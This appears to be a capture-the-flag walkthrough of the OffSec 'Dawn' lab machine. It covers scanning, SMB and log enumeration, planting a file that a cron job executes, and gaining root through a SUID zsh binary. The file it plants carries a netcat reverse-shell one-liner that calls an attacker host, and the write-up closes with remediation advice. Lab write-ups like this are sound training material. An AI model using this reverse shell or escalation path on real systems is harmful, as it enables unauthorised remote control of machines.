OffSec <br>
Dawn
---
 

# Reconnaissance/Scanning:
Let’s start things off with a network scan to see which ports are open and the services running on each.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/1c2ae617-3838-4e03-ad6b-117f7f75462e)
 
Scanning for directories with Gobuster: 

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/8952c660-bb60-4328-9140-a4ad6f9941a4)

Contents of /logs directory:

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/1fcc0626-9845-4e86-87cf-fb67e8531367)
 
I couldn’t view any except the management.log file. I’ll parse through that after I enumerate some more.

Enumerating the SMB server:
```
$ smbmap -H <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/40450078-f334-4df7-a938-cb4e6cd9aa8e)
 
I have full access to the share, however there are no files for me to get. <br>
With write abilities, I should be able to upload a reverse shell, I just need to figure out how to get the server to open it.

# Initial foothold:
Exploring the mamangement.log file it shows that pspy64 was put on this file.  <br>
Meaning that I can see the processes that were running at a certain point in time from the machine. <br>

“pspy is a command line tool designed to snoop on processes without need for root permissions. 
It allows you to see commands run by other users, cron jobs, etc. as they execute. 
Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues 
why passing secrets as arguments on the command line is a bad idea.”

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/5c9ee0ef-5bc2-4299-ab5b-76fbd7cee757)
 
Then I see that a shell is executing a file named product-control from the /ITDEPT directory.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/d6513987-19d9-4aad-82c7-229b2eeaa954)
 

I can see that there’s no file in that directory, so I’ll make my own file called `product-control`  <br>
and put it on the share since I have write access. And inside it I’ll put my one liner reverse shell code.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attack_IP> <PORT> >/tmp/f
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/ac80e68d-b481-4e1c-96af-bfab1d517a52)
 
After getting that uploaded, I waited a few seconds and then the reverse shell came through on my netcat listener!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/739888a9-3e09-4b44-a188-c516c0db0c0c)
 
I’ll grab the user flag since I have access now.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/5ee1d017-1a97-4875-9cc4-249465344ae8)
 

# Exploit:
I didn’t see any cronjobs running, aside from the one executing the reverse shell,  <br>
and there was nothing else noteworthy in the user’s home directory. <br>
I wanted to see if there were any binaries with the SUID bit set for this user.
```
$ find / -perm -u=s -type f 2>/dev/null
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/10056178-a0ed-4a56-87db-5090df9e8682)

Awesome, I can run zsh, another type of shell, as this user with higher privileges!

# Privilege Escalation:
I went to the directory /usr/bin and ran the executable from there.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/39a93301-3c00-4614-b02f-81ac278d26e6)
 
And now i’ve got root privileges! <br>
Time to get the root flag!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/62ebe6a7-1cb7-4a02-ab9d-96085632faf8)
 

# Reporting:
•	Make sure to remove files from the web server that have sensitive information or are not in use anymore. <br>
•	Regularly check the scheduled tasks in case they need to be revised/removed. <br>
•	Ensure correct permissions are set for users/groups and access to files/binaries on system are checked regularly.
